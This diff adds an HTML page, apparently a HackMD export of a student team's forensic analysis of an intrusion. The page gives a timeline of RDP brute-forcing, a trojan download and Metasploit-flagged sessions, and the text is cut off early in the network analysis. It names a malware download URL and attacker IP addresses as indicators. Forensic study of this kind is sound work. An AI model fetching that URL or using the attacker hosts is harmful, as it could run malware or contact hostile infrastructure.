@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        CCF Group 1 - HackMD
+    </title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@hackmd/emojify.js@2.1.0/dist/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{display:block;background:#fff;padding:.5em;color:#333;overflow-x:auto}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.markdown-body{font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{font-size:16px;padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important;position:relative}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p:last-child{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram,.markdown-body pre.vega{text-align:center;background-color:inherit;border-radius:0;white-space:inherit;overflow:visible}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code,.markdown-body pre.vega>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg,.markdown-body pre.vega>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p:last-child,.markdown-body .alert>ul:last-child{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.figma{display:table;position:relative;width:100%;padding-bottom:56.25%}.figma iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%;border:1px solid #eee}.MJX_Assistive_MathML{display:none}#MathJax_Message{z-index:1000!important}.ui-infobar{position:relative;z-index:2;max-width:760px;margin:25px auto -25px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:998}.ui-toc.both-mode{margin-left:8px}.ui-toc.both-mode .ui-toc-label{height:40px;padding:10px 4px;border-top-left-radius:0;border-bottom-left-radius:0}.ui-toc-label{background-color:#e6e6e6;border:none;color:#868686;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:20px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child>ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:50%;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:cover}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-more-info{color:#888;cursor:pointer;vertical-align:middle}.ui-more-info .fa{font-size:16px}.ui-connectedGithub,.ui-published-note{color:#888}.ui-connectedGithub{line-height:23px;white-space:nowrap}.ui-connectedGithub a.file-path{color:#888;text-decoration:none;padding-left:22px}.ui-connectedGithub a.file-path:active,.ui-connectedGithub a.file-path:hover{color:#888;text-decoration:underline}.ui-connectedGithub .fa{font-size:20px}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}.selectable{-webkit-user-select:text;-o-user-select:text;user-select:text}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}.site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .site-ui-font{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;letter-spacing:.025em;font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid comment-inner comment-enabled" data-hard-breaks="true"><h1 id="CCF-Group-1" data-id="CCF-Group-1"><a class="anchor hidden-xs" href="#CCF-Group-1" title="CCF-Group-1"><span class="octicon octicon-link"></span></a><span>CCF Group 1</span></h1><hr><ul>
+<li><span>Alexandr Ismatov</span></li>
+<li><span>Vladimir Shelkovnikov</span></li>
+<li><span>Ivan Okhotnikov</span></li>
+<li><span>Naghmeh Mohammadifar</span></li>
+</ul><hr><h2 id="Overview" data-id="Overview"><a class="anchor hidden-xs" href="#Overview" title="Overview"><span class="octicon octicon-link"></span></a><span>Overview:</span></h2><div class="alert alert-warning">
+<p><span>Part 1 - case001.pcap - Network analisys</span><br>
+<span>Part 2 - Autorunsc - Table of 1000 entries</span><br>
+<span>Part 3 - DC01-Pagefile - One step closer to the memory</span><br>
+<span>Part 4 - DC01-memory - Memory Analysis</span><br>
+<span>Part 5 - DC01-E01 - Log files</span><br>
+<span>Part 6 - Disk E01</span><br>
+<span>Part 7 - Sandbox</span><br>
+<span>Part 8 - DESKTOP-SDN1RPT: Memory</span><br>
+<span>Part 9 - DESKTOP-E01</span></p>
+</div><div class="alert alert-info">
+<h3 id="Timeline" data-id="Timeline"><a class="anchor hidden-xs" href="#Timeline" title="Timeline"><span class="octicon octicon-link"></span></a><span>Timeline</span></h3>
+<p><strong><span>19 September 2020 02:19:13</span></strong><span> - 194.61.24.102 ping the 10.42.85.10.</span><br>
+<strong><span>19 September 2020 02:19:26</span></strong><span> - 194.61.24.102 scan the 10.42.85.10:3389.</span><br>
+<strong><span>19 September 2020 02:20:26 - 02:21:47</span></strong><span> - tries to bruteforce the password.</span><br>
+<strong><span>19 September 2020 02:21:47</span></strong><span> - Successfuly connected.</span><br>
+<strong><span>19 September 2020 02:22:08</span></strong><span> - Connected againg.</span><br>
+<strong><span>19 September 2020 02:22:36</span></strong><span> - Connected third time.</span><br>
+<strong><span>19 September 2020 02:24:06</span></strong><span> - Trojan (coreupdater.exe) was downloaded from 194.61.24.102 to </span><strong><span>DS01</span></strong><span>.</span><br>
+<strong><span>19 September 2020 02:29:49 - 02:52:46</span></strong><span> - Connection </span><strong><span>DS 01</span></strong><span> to the server </span><code>203.78.103.109</code><span> over https, which brim marked as metasploit attack payload (since the connection lasted 22 minutes 57 seconds)</span><br>
+<strong><span>19 September 2020 02:32:13</span></strong><span> - Secret folder is accessed and added to Seret.zip.</span><br>
+<strong><span>19 September 2020 02:33:54</span></strong><span> - Original Beth secret is accessed.</span><br>
+<strong><span>19 September 2020 02:34:27</span></strong><span>- Original Beth secret is deleted, new one is created.</span><br>
+<strong><span>19 September 2020 02:35:55</span></strong><span> - 10.42.85.10 scan 10.42.85.115:3389.</span><br>
+<strong><span>19 September 2020 02:36:23</span></strong><span> - 10.42.85.10 connect to 10.42.85.115:3389 via RDP.</span><br>
+<strong><span>19 September 2020 02:39:58</span></strong><span> - Trojan was downloaded from </span><code>http://194.61.24.102/coreupdater.exe</code><span> to </span><strong><span>DESKTOP</span></strong><span>.</span><br>
+<strong><span>19 September 2020 02:40:50 - 05:38:44</span></strong><span>  - Server interaction </span><code>203.78.103.109</code><span> over https protocol c </span><strong><span>DESKTOP</span></strong><span>, which brim marked as metasploit attack payload (since the connection lasted 2 hours 57 minutes 54 seconds)</span><br>
+<strong><span>19 September 2020 02:45:34</span></strong><span> - My Social Security Number.txt is accessed on Desktop</span><br>
+<strong><span>19 September 2020 02:45:39</span></strong><span> - Plans.txt is accessed on Desktop.</span><br>
+<strong><span>19 September 2020 02:46:18</span></strong><span> - loot.zip is created on Desktop.</span><br>
+<strong><span>19 September 2020 02:47:39</span></strong><span> - Thoughts.txt is accessed on Desktop.</span><br>
+<strong><span>19 September 2020 02:56:37</span></strong><span> - coreupdater.exe process is started on DC01.</span><br>
+<strong><span>19 September 2020 04:08:16</span></strong><span> - mounting directory </span><code>\\CITADEL-DC01\FileShare</code><span> с </span><code>DS01</code><span> в </span><code>Desktop</code><br>
+<strong><span>19 September 2020 04:09:53</span></strong><span> - opened directory </span><code>\\CITADEL-DC01\FileShare</code><span> on </span><code>Desktop</code><span> and viewing the content</span></p>
+</div><hr><center>
+<h2 id="Part-1---case001pcap---Network-analisys" data-id="Part-1---case001pcap---Network-analisys"><a class="anchor hidden-xs" href="#Part-1---case001pcap---Network-analisys" title="Part-1---case001pcap---Network-analisys"><span class="octicon octicon-link"></span></a><span>Part 1 - case001.pcap - Network analisys</span></h2>
+<h3 id="Vladimir-Ivan" data-id="Vladimir-Ivan"><a class="anchor hidden-xs" href="#Vladimir-Ivan" title="Vladimir-Ivan"><span class="octicon octicon-link"></span></a><span>Vladimir, Ivan</span></h3>
+</center><hr><p><span>We have a pcap file with a traffic fragment. I used Brim to analyze this file quickly. After uploading this file to the program, I saw a large traffic volume at 2 AM (Figure 1).</span></p><center>
+<p><img src="https://i.imgur.com/2hwsXt8.png" alt="" loading="lazy"><br>
+<span>Figure 1 - Traffic</span></p>
+</center><p><span>Brim also shows traffic statistics. Figure 2 shows the statistics for suspicious traffic.</span></p><center>
+<p><img src="https://i.imgur.com/pqcnzsZ.png" alt="" loading="lazy"><br>
+<span>Figure 2 - Statistics</span></p>
+</center><p><span>There is a lot of connection-related traffic and 4 notices. So, I checked what caused it (Figure 3).</span></p><center>
+<p><img src="https://i.imgur.com/1dNImhB.png" alt="" loading="lazy"><br>
